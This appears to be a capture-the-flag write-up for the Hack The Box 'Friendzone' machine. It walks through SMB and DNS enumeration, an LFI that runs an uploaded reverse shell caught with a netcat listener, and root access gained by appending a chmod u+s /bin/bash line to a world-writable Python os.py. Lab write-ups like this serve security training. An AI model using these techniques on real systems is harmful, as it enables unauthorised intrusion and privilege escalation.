---
layout: default
---

# Friendzone

# Enumeration

IP → 10.10.10.123

Open ports.

```sql
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack
22/tcp  open  ssh          syn-ack
53/tcp  open  domain       syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
443/tcp open  https        syn-ack
445/tcp open  microsoft-ds syn-ack
```

We check first all the transfer files server.

### SMB

```sql
[+] IP: 10.10.10.123:445        Name: 10.10.10.123              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

We obtain credentials for the general share → `admin:WORKWORKHhallelujah@#`

- `admin:WORKWORKHhallelujah@#` → No new creds for SMB

### FTP

- Anonymous login not enabled
- `admin:WORKWORKHhallelujah@#` → not valid

### HTTP

Inital recon

```bash
┌──(kali㉿kali)-[~/machines/linux/friendzone/enumeration]
└─$ curl -I 10.10.10.123         
HTTP/1.1 200 OK
Date: Wed, 20 Dec 2023 15:33:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Fri, 05 Oct 2018 22:52:00 GMT
ETag: "144-577831e9005e6"
Accept-Ranges: bytes
Content-Length: 324
Vary: Accept-Encoding
Content-Type: text/html

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/machines/linux/friendzone/enumeration]
└─$ whatweb  10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
```

We found strange routes:

```bash
===============================================================
/index.html           (Status: 200) [Size: 324]
/.html                (Status: 403) [Size: 292]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.123/wordpress/]
```

wordpress route seems to be empty. We have directory listing there but it is empty.

Nothing in the image in the index.html

### HTTPs

Fuzzing with:

- common.txt → nothing
- raft-large-word.txt → nothing
- directory-list-2.3-medium.txt

### DNS

After tryint to retrieve some typical DNS records (A,ANY,TXT,AAAA), we try a transfer zone attack and is successful.

```sql
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
```

In addition we have also the base domain and another one that can be seen in a email address in the HTTP web site. So we have the following domains:

- friendzone.red
- friendzoneportal.red
- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red

Could be more domains so we will bruteforce for more domains.

We have found a LFI in the [https://administrator1.friendzone.red/dashboard.php](https://administrator1.friendzone.red/dashboard.php) in the `pagename` param. But any payload we add here will be appended a php extension. Two ways can be taken:

- Include a malicious php file. We need upload capabilities.
- We dump the contents of a php file that leaks a password or sensitive information.

### Fuzzing

- uploads
    
    ```bash
    ┌──(kali㉿kali)-[~/…/linux/friendzone/files/administrator1]
    └─$ gobuster dir -k -w  ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php --url  https://uploads.friendzone.red
    ===============================================================
    /.php                 (Status: 403) [Size: 302]
    /files                (Status: 301) [Size: 334] [--> https://uploads.friendzone.red/files/]
    /upload.php           (Status: 200) [Size: 38]
    /.php                 (Status: 403) [Size: 302]
    Progress: 184721 / 441122 (41.88%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 184778 / 441122 (41.89%)
    ===============================================================
    ```
    
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ gobuster dir -k -w  ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php --url https://uploads.friendzone.red/files/
    ===============================================================
    /.php                 (Status: 403) [Size: 308]
    /note                 (Status: 200) [Size: 20]
    /.php                 (Status: 403) [Size: 308]
    Progress: 177117 / 441122 (40.15%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 177175 / 441122 (40.16%)
    ===============================================================
    ```
    
- administrator1
    
    ```bash
    ┌──(kali㉿kali)-[~/machines/linux/friendzone/files]
    └─$ gobuster dir -k -w  ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php --url  https://administrator1.friendzone.red/
    ===============================================================
    /.php                 (Status: 403) [Size: 309]
    /images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
    /login.php            (Status: 200) [Size: 7]
    /dashboard.php        (Status: 200) [Size: 101]
    /timestamp.php        (Status: 200) [Size: 36]
    /.php                 (Status: 403) [Size: 309]
    Progress: 187850 / 441122 (42.58%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 187863 / 441122 (42.59%)
    ===============================================================
    ```
    
- hr
    
    ```bash
    ┌──(kali㉿kali)-[~/…/linux/friendzone/files/administrator1]
    └─$ gobuster dir -k -w  ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php --url  https://hr.friendzone.red
    ===============================================================
    Progress: 188287 / 441122 (42.68%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 188296 / 441122 (42.69%)
    ===============================================================
    ```
    

# Uploading a file to Development share

When upload a file called payload with extension php and zip we found it in the next locations.

- https://uploads.friendzone.red/
- https://uploads.friendzone.red/files/
- https://uploads.friendzone.red/development/
- https://uploads.friendzone.red/Development/
- https://hr.friendzone.red/development/
- https://hr.friendzone.red/Development/
- http://friendzone.red/wordpress/

The route to the development share is /etc/Development. We can infier this from the comment in the Files share.

# Executing the payload

If we upload a reverse shell to Development share we will be able to acces this using a LFI vulnerability present in the administrator1 subdomain.

- `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/payload`

We receive a shell

```bash
┌──(kali㉿kali)-[~/tools]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.123] 58266
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/var/www/admin$
```

A little bit of enumeration and we get to find the password for the user friend

# Privilege escalation

We found a script runing as a cronjob using pspy

```bash
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

The library os is actually writable by anyone.

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -la os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 os.py
friend@FriendZone:/usr/lib/python2.7$
```

If we add at the end of os.py file, the string:

- `system(”chmod u+s /bin/bash”)`

Next time root uses this library will set the bash with the SUID privilege.

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
friend@FriendZone:/usr/lib/python2.7$ bash -p
bash-4.4# whoami 
root
```